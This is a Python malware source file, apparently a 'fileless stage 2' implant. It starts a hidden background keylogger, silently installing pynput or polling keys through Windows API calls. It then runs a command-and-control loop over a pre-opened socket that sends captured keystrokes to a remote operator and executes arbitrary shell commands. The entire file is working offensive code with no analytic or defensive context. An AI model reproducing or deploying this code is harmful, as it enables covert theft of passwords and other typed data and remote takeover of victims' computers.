import subprocess
import os
import threading
import time
import sys

# Global buffer to store intercepted keystrokes
keystroke_buffer = ""
logging_active = True

def keylogger_thread():
    global keystroke_buffer, logging_active
    try:
        # Attempt silent installation of pynput if it is missing
        try:
            import pynput
        except ImportError:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "pynput"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

        # Attempt to use pynput if available on the target system
        from pynput.keyboard import Listener
        
        def on_press(key):
            global keystroke_buffer
            try:
                keystroke_buffer += key.char
            except AttributeError:
                if key == key.space:
                    keystroke_buffer += " "
                elif key == key.enter:
                    keystroke_buffer += "\n"
                else:
                    keystroke_buffer += f"[{key}]"

        with Listener(on_press=on_press) as listener:
            while logging_active:
                time.sleep(1)
            listener.stop()
            
    except Exception:
        # Fallback for Windows using ctypes (Zero Dependencies Required)
        if os.name == 'nt':
            import ctypes
            user32 = ctypes.windll.user32
            while logging_active:
                for i in range(1, 256):
                    if user32.GetAsyncKeyState(i) & 1:
                        if i == 13:
                            keystroke_buffer += "\n"
                        elif i == 32:
                            keystroke_buffer += " "
                        else:
                            # Basic mapping for demonstration; advanced mapping requires virtual key code translation
                            keystroke_buffer += chr(i)
                time.sleep(0.01)
        else:
            keystroke_buffer = "[!] Keylogger requires the 'pynput' module on Linux/macOS. Run 'pip install pynput' on the target."

def run_c2():
    global client_socket, keystroke_buffer, logging_active
    
    # Start the stealthy keylogger in a background thread
    k_thread = threading.Thread(target=keylogger_thread, daemon=True)
    k_thread.start()

    client_socket.send(b"\n[+] Fileless Stage 2 Keylogger & C2 Initialized!\n")
    client_socket.send(b"[*] Type 'keydump' to view intercepted keystrokes.\n")
    client_socket.send(b"[*] Type 'keyclear' to wipe the log buffer.\n\n")
    
    while True:
        try:
            cmd = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd: continue
            
            if cmd.lower() in ['exit', 'quit']:
                logging_active = False
                break
                
            # --- Custom Post-Exploitation Commands ---
            if cmd.lower() == 'keydump':
                if not keystroke_buffer:
                    client_socket.send(b"[!] Keystroke buffer is currently empty.\n")
                else:
                    output = f"\n--- Intercepted Keystrokes ---\n{keystroke_buffer}\n------------------------------\n"
                    client_socket.send(output.encode('utf-8', errors='ignore'))
                continue
                
            if cmd.lower() == 'keyclear':
                keystroke_buffer = ""
                client_socket.send(b"[+] Keystroke buffer cleared.\n")
                continue

            # --- Standard OS Command Execution ---
            if cmd.startswith('cd '):
                try: os.chdir(cmd[3:].strip())
                except Exception as e: client_socket.send(f"{e}\n".encode())
                else: client_socket.send(b"\n")
                continue
            
            out = subprocess.getoutput(cmd)
            client_socket.send((out + "\n").encode('utf-8', errors='ignore'))
            
        except Exception as e:
            break
            
# Stager entry point
run_c2()